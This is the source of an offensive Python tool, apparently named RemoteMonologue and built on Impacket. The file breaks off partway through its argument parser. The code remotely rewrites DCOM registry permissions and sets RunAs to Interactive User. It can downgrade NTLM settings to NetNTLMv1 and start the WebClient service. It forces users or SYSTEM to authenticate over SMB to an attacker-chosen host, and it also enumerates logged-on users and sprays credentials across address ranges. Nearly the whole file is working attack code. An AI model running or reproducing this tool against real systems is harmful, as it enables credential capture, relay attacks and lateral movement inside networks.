#!/usr/bin/python3

from __future__ import division
from __future__ import print_function
import argparse
import logging
import sys
import time
import random
import string
import os
import struct
import socket
import re
import uuid
import codecs

from impacket import version
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
    VARIANT, VARENUM, DISPATCH_METHOD, DISPATCH_PROPERTYPUT, DISPATCH_PROPERTYPUTREF, DISPID_ARRAY
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
    IRemUnknown2, INTERFACE
from impacket.dcerpc.v5.dtypes import NULL, LONG, MAXIMUM_ALLOWED
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket import version
from impacket.dcerpc.v5 import transport, rrp, scmr,lsat, lsad
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.smb3structs import *
from impacket.ldap import ldaptypes
from impacket.dcerpc.v5 import transport, rrp, scmr, rpcrt
from impacket.system_errors import ERROR_NO_MORE_ITEMS
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import ndr
from impacket.dcerpc.v5.dcom import wmi

text_green = '\033[92m'
text_blue = '\033[36m'
text_yellow = '\033[93m'
text_red = '\033[91m'
text_end = '\033[0m'

class RemoteMonologue:
    def __init__(self, username='', password='', domain='', address='', hashes=None, aesKey=None,
                 doKerberos=False, kdcHost=None, auth_to=None, output='', dcom='', downgrade=False, webclient=False, timeout=5):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__address = address
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__auth_to = auth_to
        self.__output = output
        self.__timeout = timeout
        self.__dcom = dcom
        self.__downgrade = downgrade
        self.__webclient = webclient
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def getInterface(self, interface, resp):
        # Now let's parse the answer and build an Interface instance
        objRefType = OBJREF(b''.join(resp))['flags']
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(b''.join(resp))
        else:
            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                      target=interface.get_target()))

    def checkSMB(self):

        # Test conection to port 445 with timeout
        try:
            sock = socket.create_connection((self.__address, 445), self.__timeout)
        except Exception as e:
            if str(e).find("timed out") >= 0:
                logging.error(f"Failed to connect to port {self.__address}:445")
                if self.__output != None:
                    output_file = open(self.__output, "a")
                    output_file.write("[~] Failed to connect to port 445," + self.__address + "\n")
                    output_file.close()
                return False

            elif str(e).find("No route to host") >= 0:
                logging.error(f"No route to host {self.__address}")
                if self.__output != None:
                    output_file = open(self.__output, "a")
                    output_file.write("[~] No route to host," + self.__address + "\n")
                    output_file.close()
                return False
            else:
                logging.error(f"Unknown error: {e}")
                return False

        return True

    def registry_modifications(self):

        ntlmExists = False
        ntlmVal = -1
        ntlmCreated = False

        if (self.__dcom != None):
            logging.info(f"Targeting {self.__dcom} COM object")
        else:
            logging.info("Targeting ServerDataCollectorSet COM object")


        if ((self.__dcom != "UpdateSession" or self.__downgrade == True)):

            if not self.__webclient:
                if not self.checkSMB():
                    return
          
            smbclient = SMBConnection(self.__address, self.__address)

            if options.k is True:
                smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
            else:
                smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)


            for attempt in range(3):
                try:
                    string_binding = r'ncacn_np:%s[\pipe\winreg]'
                    rpc = transport.DCERPCTransportFactory(string_binding)
                    rpc.set_smb_connection(smbclient)
                    dce = rpc.get_dce_rpc()
                    dce.connect()
                    logging.debug("Connected to RemoteRegistry!")
                    break
                except (Exception) as e:
                    if str(e).find("STATUS_PIPE_NOT_AVAILABLE") >= 0:
                        logging.debug("STATUS_PIPE_NOT_AVAILABLE. Retrying in 0.5 seconds...")
                        time.sleep(0.5)
                    else:
                        logging.error("Failed to connect to RemoteRegistry:", e)
                        if self.__output != None:
                            output_file = open(self.__output, "a")
                            output_file.write("[-] Failed to connect to RemoteRegistry," + self.__address + "\n")
                            output_file.close()
                        return

        
        dce.bind(rrp.MSRPC_UUID_RRP)

        reg_handle = rrp.hOpenLocalMachine(dce)

        if (self.__dcom != "UpdateSession"):

            if (self.__dcom == "ServerDataCollectorSet" or self.__dcom == None):
                registry_path = "SOFTWARE\\Classes\\AppID\\{03837503-098b-11d8-9414-505054503030}"
            elif (self.__dcom == "FileSystemImage"):
                registry_path = "SOFTWARE\\Classes\\AppID\\{2C941FD1-975B-59BE-A960-9A2A262853A5}"


            # Open the registry key
            key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                registry_path,
                samDesired=(MAXIMUM_ALLOWED),
            )

            # Get the OWNER security descriptor
            resp = rrp.hBaseRegGetKeySecurity(
                dce,
                key_handle["phkResult"],
                scmr.OWNER_SECURITY_INFORMATION,
            )

            owner_security_descriptor = b''.join(resp['pRpcSecurityDescriptorOut']['lpSecurityDescriptor'])

            # Get the DACL security descriptor
            resp = rrp.hBaseRegGetKeySecurity(
                dce,
                key_handle["phkResult"],
                scmr.DACL_SECURITY_INFORMATION,
            )

            dacl_security_descriptor = b''.join(resp['pRpcSecurityDescriptorOut']['lpSecurityDescriptor'])


            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])

            
            logging.debug(f"Changing OWNER and DACL for {registry_path}")


            key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                registry_path,
                samDesired=(WRITE_OWNER),
            )

            # Set Owner to Administrators
            new_owner = (b'\x01\x00\x00\x80\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                         b'\x00\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05 \x00\x00\x00 \x02\x00\x00'
                         )
            
            resp = self.hBaseRegSetKeySecurity(
                dce,
                key_handle["phkResult"],
                new_owner,
                scmr.OWNER_SECURITY_INFORMATION,
                )

            # Set Full Control to Administrators
            new_dacl = (b'\x01\x00\x04\x94\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                        b'\x14\x00\x00\x00\x02\x00\xc4\x00\x06\x00\x00\x00\x00\x02\x28\x00'
                        b'\x3f\x00\x0f\x00\x01\x06\x00\x00\x00\x00\x00\x05\x50\x00\x00\x00'
                        b'\xb5\x89\xfb\x38\x19\x84\xc2\xcb\x5c\x6c\x23\x6d\x57\x00\x77\x6e'
                        b'\xc0\x02\x64\x87\x00\x02\x14\x00\x19\x00\x02\x00\x01\x01\x00\x00'
                        b'\x00\x00\x00\x05\x12\x00\x00\x00\x00\x02\x18\x00\x3f\x00\x0f\x00'
                        b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00'
                        b'\x00\x02\x18\x00\x19\x00\x02\x00\x01\x02\x00\x00\x00\x00\x00\x05'
                        b'\x20\x00\x00\x00\x21\x02\x00\x00\x00\x02\x18\x00\x19\x00\x02\x00'
                        b'\x01\x02\x00\x00\x00\x00\x00\x0f\x02\x00\x00\x00\x01\x00\x00\x00'
                        b'\x00\x02\x38\x00\x19\x00\x02\x00\x01\x0a\x00\x00\x00\x00\x00\x0f'
                        b'\x03\x00\x00\x00\x00\x04\x00\x00\xb0\x31\x80\x3f\x6c\xbc\x63\x4c'
                        b'\x3c\xe0\x50\xd1\x97\x0c\xa1\x62\x0f\x01\xcb\x19\x7e\x7a\xa6\xc0'
                        b'\xfa\xe6\x97\xf1\x19\xa3\x0c\xce'
                        )


            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])


            key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                registry_path,
                samDesired=(WRITE_DAC),
            )

            resp = self.hBaseRegSetKeySecurity(
                dce,
                key_handle["phkResult"],
                new_dacl,
                scmr.DACL_SECURITY_INFORMATION,
                )

            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])


            key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                registry_path,
                samDesired=(MAXIMUM_ALLOWED),
            )

            # Add Interactive User value
            logging.info("Setting RunAs value to Interactive User")

            ans = rrp.hBaseRegSetValue(
                dce,
                key_handle["phkResult"],
                "RunAs",
                rrp.REG_SZ,
                "Interactive User"
                )

        if(self.__downgrade):

            logging.info("Running NetNTLMv1 downgrade attack")
            
            ntlm_key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                'SYSTEM\\CurrentControlSet\\Control\\Lsa',
                samDesired=MAXIMUM_ALLOWED,
                )

            try:

                ntlm_value = rrp.hBaseRegQueryValue(
                    dce,
                    ntlm_key_handle["phkResult"],
                    'LmCompatibilityLevel'
                    )
                
                ntlmVal = ntlm_value[1]


                if ntlmVal > 2:

                    logging.debug(f"Changing LmCompatibilityLevel to 2")


                    ans = rrp.hBaseRegSetValue(
                        dce,
                        ntlm_key_handle["phkResult"],
                        'LmCompatibilityLevel',
                        rrp.REG_DWORD,
                        2
                        )

                    ntlmExists = True

                else:
                    logging.debug("LmCompatibilityLevel is under 3, no need to change it")

            except (Exception) as e:
                
                logging.debug("No LmCompatibilityLevel value discovered. Adding LmCompatibilityLevel to 2")
                
                ans = rrp.hBaseRegSetValue(
                    dce,
                    ntlm_key_handle["phkResult"],
                    'LmCompatibilityLevel',
                    rrp.REG_DWORD,
                    2
                    )
                
                ntlmCreated = True

            rrp.hBaseRegCloseKey(dce, ntlm_key_handle["phkResult"])


        # Run coercion attack
        self.dcom_coerce()


        if(self.__downgrade and (ntlmExists or ntlmCreated)):

            ntlm_key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                'SYSTEM\\CurrentControlSet\\Control\\Lsa',
                samDesired=MAXIMUM_ALLOWED,
                )

            if(ntlmExists and ntlmVal >= 0):

                logging.debug(f"Reverting LmCompatibilityLevel back to {ntlmVal}")

                ans = rrp.hBaseRegSetValue(
                    dce,
                    ntlm_key_handle["phkResult"],
                    'LmCompatibilityLevel',
                    rrp.REG_DWORD,
                    ntlmVal
                    )

            elif (ntlmCreated):

                logging.debug("Deleting LmCompatibilityLevel to revert back to its original configuration")

                ans = rrp.hBaseRegDeleteValue(
                    dce,
                    ntlm_key_handle["phkResult"],
                    'LmCompatibilityLevel',
                    )

            rrp.hBaseRegCloseKey(dce, ntlm_key_handle["phkResult"])


        if (self.__dcom != "UpdateSession"):

            # Delete RunAs key
            logging.debug("Removing RunAs value")

            ans = rrp.hBaseRegDeleteValue(
                dce,
                key_handle["phkResult"],
                'RunAs',
                )

            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])

            logging.debug("Reverting OWNER and DACL registry permissions")

            key_handle = rrp.hBaseRegOpenKey(
                dce,
                reg_handle["phKey"],
                registry_path,
                samDesired=(WRITE_OWNER | WRITE_DAC),
            )

            # Reset the DACL security descriptor
            resp = self.hBaseRegSetKeySecurity(
                dce,
                key_handle["phkResult"],
                dacl_security_descriptor,
                scmr.DACL_SECURITY_INFORMATION,
                )

            # Reset the OWNER security descriptor
            resp = self.hBaseRegSetKeySecurity(
                dce,
                key_handle["phkResult"],
                owner_security_descriptor,
                scmr.OWNER_SECURITY_INFORMATION,
                )

            rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])        

        rrp.hBaseRegCloseKey(dce, reg_handle["phKey"])
        
        dce.disconnect()
        

    def hBaseRegSetKeySecurity(self, dce, hKey, pRpcSecurityDescriptor, securityInformation = scmr.OWNER_SECURITY_INFORMATION):
        # Thank you @skelsec

        #class BYTE_ARRAY(NDRUniConformantVaryingArray):
        #   pass
        #
        #class PBYTE_ARRAY(NDRPOINTER):
        #   referent = (
        #       ('Data', BYTE_ARRAY),
        #   )
        #
        #class RPC_SECURITY_DESCRIPTOR(NDRSTRUCT):
        #   structure =  (
        #       ('lpSecurityDescriptor',PBYTE_ARRAY),
        #       ('cbInSecurityDescriptor',DWORD),
        #       ('cbOutSecurityDescriptor',DWORD),
        #   )

        #constuct the request

        secdesc = rrp.RPC_SECURITY_DESCRIPTOR()
        secdesc['lpSecurityDescriptor'] = pRpcSecurityDescriptor
        secdesc['cbInSecurityDescriptor'] = len(pRpcSecurityDescriptor)
        secdesc['cbOutSecurityDescriptor'] = len(pRpcSecurityDescriptor)

        request = rrp.BaseRegSetKeySecurity()
        request['hKey'] = hKey
        request['SecurityInformation'] = securityInformation
        request['pRpcSecurityDescriptor'] = secdesc
        return dce.request(request)


    def enableWebclient(self):

        if not self.checkSMB():
            return

        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.__address
        logging.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.setRemoteHost(self.__address)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        dce = rpctransport.get_dce_rpc()

        dce.connect()

        dce.bind(scmr.MSRPC_UUID_SCMR)
        rpc = dce
        ans = scmr.hROpenSCManagerW(rpc)
        scManagerHandle = ans['lpScHandle']
        
        try:
            ans = scmr.hROpenServiceW(rpc, scManagerHandle, "WebClient"+'\x00')
            serviceHandle = ans['lpServiceHandle']
        except Exception as e:
            logging.error(f"WebClient service not accessible on {self.__address}")                
            return

    
        logging.info(f"Querying status for WebClient on {self.__address}")
        resp = scmr.hRQueryServiceStatus(rpc, serviceHandle)
        state = resp['lpServiceStatus']['dwCurrentState']
        if state == scmr.SERVICE_CONTINUE_PENDING:
           logging.info("WebClient status: CONTINUE PENDING")
        elif state == scmr.SERVICE_PAUSE_PENDING:
           logging.info("WebClient status: PAUSE PENDING")
        elif state == scmr.SERVICE_PAUSED:
           logging.info("WebClient status: PAUSED")
        elif state == scmr.SERVICE_RUNNING:
           logging.info("WebClient status: RUNNING")
        elif state == scmr.SERVICE_START_PENDING:
           logging.info("WebClient status: START PENDING")
        elif state == scmr.SERVICE_STOP_PENDING:
           logging.info("WebClient status: STOP PENDING")
        elif state == scmr.SERVICE_STOPPED:
           logging.info("WebClient status: STOPPED")
        else:
           logging.info("WebClient status: UNKNOWN. WebClient might not be installed on target system!")


        if state == scmr.SERVICE_RUNNING:
            if (self.__dcom == "UpdateSession"):
                logging.info("Targeting UpdateSession COM object")
                self.dcom_coerce()
            else:
                self.registry_modifications()

        elif state == scmr.SERVICE_STOPPED:
            logging.info("Starting WebClient service. Waiting 5 seconds...")
            scmr.hRStartServiceW(rpc, serviceHandle)
            time.sleep(5)
            if (self.__dcom == "UpdateSession"):
                logging.info("Targeting UpdateSession COM object")
                self.dcom_coerce()
            else:
                self.registry_modifications()
            logging.info("Stopping WebClient service")
            scmr.hRControlService(rpc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
        
        else:
            logging.error("WebClient can't be started. Try again with -downgrade instead.")

        scmr.hRCloseServiceHandle(rpc, scManagerHandle)
        dce.disconnect()

        return


    def run_query(self):

        dcom = DCOMConnection(self.__address, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        descriptor, _ = iWbemServices.GetObject('StdRegProv')
        retVal = descriptor.EnumKey(2147483651,'\x00')
        descriptor.RemRelease()
        iWbemServices.RemRelease()
        dcom.disconnect()

        sidRegex = "^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$"
        index = 0
        users = list()
        while True:
            try:
                res = re.match(sidRegex, retVal.sNames[index])
                if res:
                    users.append(retVal.sNames[index])
                index += 1
            except:
                break
        

        smbclient = SMBConnection(self.__address, self.__address)
        if options.k is True:
            smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
        else:
            smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)


        lsaRpcBinding = r'ncacn_np:%s[\pipe\lsarpc]'
        rpc = transport.DCERPCTransportFactory(lsaRpcBinding)
        rpc.set_smb_connection(smbclient)
        dce = rpc.get_dce_rpc()
        dce.connect()
        
        dce.bind(lsat.MSRPC_UUID_LSAT)
        
        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']
       
        try:
            resp = lsat.hLsarLookupSids(dce, policyHandle, users,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
        except DCERPCException as e:
            if str(e).find('STATUS_NONE_MAPPED') >= 0:
                pass
            elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                resp = e.get_packet()
            else: 
                raise
        if resp['TranslatedNames']['Names'] == []:
            logging.error("No one is currently logged in")
        else:
            logging.info(f"Potential users logged on {self.__address}:")
            for item in resp['TranslatedNames']['Names']:
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    logging.info(f"   {resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name']}\\{item['Name']}")
        dce.disconnect()


    def run(self):

        if self.__webclient:
            self.enableWebclient()
            return

        if (self.__dcom == "UpdateSession" and self.__downgrade):
            self.registry_modifications()
        elif (self.__dcom == "UpdateSession"):
            logging.info("Targeting UpdateSession COM object")
            self.dcom_coerce()
        else:
            self.registry_modifications()


    def dcom_coerce(self):
        global text_green, text_blue, text_yellow, text_red, text_end

	   # Initiate DCOM connection
        try:
            # Timeout checker
            stringBinding = r'ncacn_ip_tcp:%s[135]' % self.__address
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(self.__timeout)
            dce = transport.get_dce_rpc()
            dce.connect()


            try:
                dcom = DCOMConnection(self.__address, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                      self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

                dispParams = DISPPARAMS(None, False)
                dispParams['rgvarg'] = NULL
                dispParams['rgdispidNamedArgs'] = NULL
                dispParams['cArgs'] = 0
                dispParams['cNamedArgs'] = 0                

                if (self.__dcom == "UpdateSession"):

                    # UpdateSession CLSID for SYSTEM authentication
                    iInterface = dcom.CoCreateInstanceEx(string_to_bin('4CB43D7F-7EEE-4906-8698-60DA1C38F2FE'), IID_IDispatch)

                    iUpdateSession = IDispatch(iInterface)
                    CreateUpdateServiceManager = iUpdateSession.GetIDsOfNames(('CreateUpdateServiceManager',))[0]
                    hCreateUpdateServiceManager = iUpdateSession.Invoke(CreateUpdateServiceManager, 0x409, DISPATCH_METHOD, dispParams, 0, [], [])

                    iCreateUpdateServiceManager = IDispatch(self.getInterface(iUpdateSession, hCreateUpdateServiceManager['pVarResult']['_varUnion']['pdispVal']['abData']))

                    pAddScanPackageService = iCreateUpdateServiceManager.GetIDsOfNames(('AddScanPackageService',)) [0]
                    
                    AuthenticationCoercer((iCreateUpdateServiceManager, pAddScanPackageService), self.__auth_to, self.__dcom)

                elif (self.__dcom == "ServerDataCollectorSet" or self.__dcom == None):

                    # DataManager CLSID for Interactive User authentication
                    iInterface = dcom.CoCreateInstanceEx(string_to_bin('03837546-098b-11d8-9414-505054503030'), IID_IDispatch)

                    iServerDataCollectorSet = IDispatch(iInterface)
                    resp = iServerDataCollectorSet.GetIDsOfNames(('datamanager',))[0]
                    resp = iServerDataCollectorSet.Invoke(resp, 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

                    iDataManager = IDispatch(self.getInterface(iServerDataCollectorSet, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
                    pExtract = iDataManager.GetIDsOfNames(('extract',))[0]

                    AuthenticationCoercer((iDataManager, pExtract), self.__auth_to, self.__dcom)              

                elif (self.__dcom == "FileSystemImage"):
                    
                    # FileSystemImage CLSID for Interactive User authentication
                    iInterface = dcom.CoCreateInstanceEx(string_to_bin('2C941FC5-975B-59BE-A960-9A2A262853A5'), IID_IDispatch)

                    iFileSystemImage = IDispatch(iInterface)
                    pWorkingdirectory = iFileSystemImage.GetIDsOfNames(('workingdirectory',))[0]

                    AuthenticationCoercer((iFileSystemImage, pWorkingdirectory), self.__auth_to, self.__dcom)              
               
            except  (Exception) as e:
                if str(e).find("OAUT SessionError: unknown error code: 0x0") >= 0:
                	logging.debug("Got exepcted 0x0 SessionError")
                	print(text_green + "[+] Coerced SMB authentication! %+35s" % self.__address + text_end)

                	if self.__output != None:
                	    output_file = open(self.__output, "a")
                	    output_file.write("[+] Forced SMB authentication for Interactive User," + self.__address + "\n")
                	    output_file.close()
                elif str(e).find("DCOM SessionError: code: 0x8000401a - CO_E_RUNAS_LOGON_FAILURE") >= 0:
                    logging.debug("Got RUNAS_LOGON_FAILURE")
                    print(text_blue + "[~] Local admin but no Interactive User %+47s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[~] Local admin but no Interactive User," + self.__address + "\n")
                    	output_file.close()
                elif str(e).find("access_denied") >= 0:
                    logging.debug("Got ACCESS_DENIED")
                    print(text_red + "[-] Access denied %+69s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[-] Access denied," + self.__address + "\n")
                    	output_file.close()
                elif str(e).find("REGDB_E_CLASSNOTREG") >= 0:
                    logging.debug("Got REGDB_E_CLASSNOTREG")
                    print(text_blue + "[~] Local admin but DCOM class not registered %+41s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[~] DCOM class not registered," + self.__address + "\n")
                    	output_file.close()
                else:
                    logging.error(str(e))
                
                dcom.disconnect()
                sys.stdout.flush()
                
            except KeyboardInterrupt:
                sys.exit(0)

            dce.disconnect()
        
        except (Exception) as e:
            if str(e).find("No route to host") >= 0:
                    logging.debug("No route to host")
                    print(text_yellow + "[!] No route to host %+66s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[!] No route to host," + self.__address + "\n")
                    	output_file.close()
            elif str(e).find("Network is unreachable") >= 0:
                    logging.debug("Network is unreachable")
                    print(text_yellow + "[!] Network is unreachable %+60s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[!] Network is unreachable," + self.__address + "\n")
                    	output_file.close()                    
            elif str(e).find("timed out") >= 0:
                    logging.debug("Connection timed out")
                    print(text_yellow + "[!] Connection timed out %+62s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[!] Connection timed out," + self.__address + "\n")
                    	output_file.close()   
            elif str(e).find("Connection refused") >= 0:
                    logging.debug("Connection refused")
                    print(text_yellow + "[!] Connection refused %+64s" % self.__address + text_end)
                    if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[!] Connection refused," + self.__address + "\n")
                    	output_file.close()                   
            else:
                logging.debug("Unkown error: " + str(e) + " for " + self.__address)
                if self.__output != None:
                    	output_file = open(self.__output, "a")
                    	output_file.write("[!] Unknown error," + self.__address + "\n")
                    	output_file.close()                 

            
        except KeyboardInterrupt:
            sys.exit(0)
            
        
class AuthenticationCoercer():

    def __init__(self, executeUNCpath, auth_to, dcom):
        self._executeUNCpath = executeUNCpath
        self._auth_to = auth_to
        self.__dcom = dcom
        self.execute_remote()
        
        
    def execute_remote(self):
    
        tmpShare = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
    
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(4)])

        tmpFileName = tmpName + '.txt'

        UNCpath = "\\\\%s\\%s\\%s" % (self._auth_to, tmpShare, tmpFileName)

        logging.debug('Setting UNC path: %s' % UNCpath)

        if (self.__dcom == "UpdateSession" or self.__dcom == "ServerDataCollectorSet" or self.__dcom == None):

            dispParams = DISPPARAMS(None, False)
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs'] = 2	
            dispParams['cNamedArgs'] = 0
            
            arg0 = VARIANT(None, False)
            arg0['clSize'] = 5
            arg0['vt'] = VARENUM.VT_BSTR
            arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
            arg0['_varUnion']['bstrVal']['asData'] = "XFORCERED"

            arg1 = VARIANT(None, False)
            arg1['clSize'] = 5
            arg1['vt'] = VARENUM.VT_BSTR
            arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
            arg1['_varUnion']['bstrVal']['asData'] = UNCpath
            
            if (self.__dcom == "UpdateSession"):
                dispParams['rgvarg'].append(arg1)
                dispParams['rgvarg'].append(arg0)
            elif (self.__dcom == "ServerDataCollectorSet" or self.__dcom == None):
                dispParams['rgvarg'].append(arg0)
                dispParams['rgvarg'].append(arg1)

            self._executeUNCpath[0].Invoke(self._executeUNCpath[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])

        elif(self.__dcom == "FileSystemImage"):
            
            # Convert -3 to unsigned 32-bit
            DISPID_PROPERTYPUT = 0xFFFFFFFD 

            dispParams = DISPPARAMS(None, False)
            dispParams['rgvarg'] = []
            dispParams['rgdispidNamedArgs'] = [DISPID_PROPERTYPUT]
            dispParams['cArgs'] = 1
            dispParams['cNamedArgs'] = 1
            
            arg0 = VARIANT(None, False)
            arg0['clSize'] = 12
            arg0['vt'] = VARENUM.VT_BSTR
            arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
            arg0['_varUnion']['bstrVal']['asData'] = UNCpath

            dispParams['rgvarg'].append(arg0)

            self._executeUNCpath[0].Invoke(self._executeUNCpath[1], 0x000, DISPATCH_PROPERTYPUT, dispParams, 0, [], [])
       

class AuthFileSyntaxError(Exception):

    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path=path
        self.lineno=lineno
        self.reason=reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason )

def load_smbclient_auth_file(path):

    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno=0
    domain=None
    username=None
    password=None
    for line in open(path):
        lineno+=1

        line = line.strip()

        if line.startswith('#') or line=='':
            continue

        parts = line.split('=',1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k,v) = (parts[0].strip(), parts[1].strip())

        if k=='username':
            username=v
        elif k=='password':
            password=v
        elif k=='domain':
            domain=v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)


def parseServers(server):
    if '/' not in server:
        return [server]
    (ip, cidr) = server.split('/')
    cidr = int(cidr)
    host_bits = 32 - cidr
    i = struct.unpack('>I', socket.inet_aton(ip))[0]
    start = (i >> host_bits) << host_bits
    end = i | ((1 << host_bits) - 1)
    ret = []
    for i in range(start, end):
        ret.append(socket.inet_ntoa(struct.pack('>I', i)))
    return ret

# Process command-line arguments.
if __name__ == '__main__':

    print(text_green + """
 __   ___        __  ___  ___        __        __        __   __        ___ 
|__) |__   |\/| /  \  |  |__   |\/| /  \ |\ | /  \ |    /  \ / _` |  | |__  
|  \ |___  |  | \__/  |  |___  |  | \__/ | \| \__/ |___ \__/ \__> \__/ |___ 
                                                                            
                                  
                        v1.0.0 - @AndrewOliveau
                                                """ + text_end)

    parser = argparse.ArgumentParser(add_help = True, description = "DCOM NTLM authentication coercer and sprayer")
    

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-dcom', action='store', metavar = "", help='DCOM object  - ServerDataCollectorSet (default), FileSystemImage, UpdateSession (SYSTEM)')                      
    parser.add_argument('-auth-to', action='store', metavar = "ip address", help='Server for Interactive User to authenticate to over SMB')
    parser.add_argument('-spray', action='store_true', default = False,
                        help='Spray credentials against provided list of systems. Filename must be provided in domain/user@FILE')
    parser.add_argument('-query', action='store_true', default = False, help='Query users logged on the target system')
    parser.add_argument('-downgrade', action='store_true', default = False,
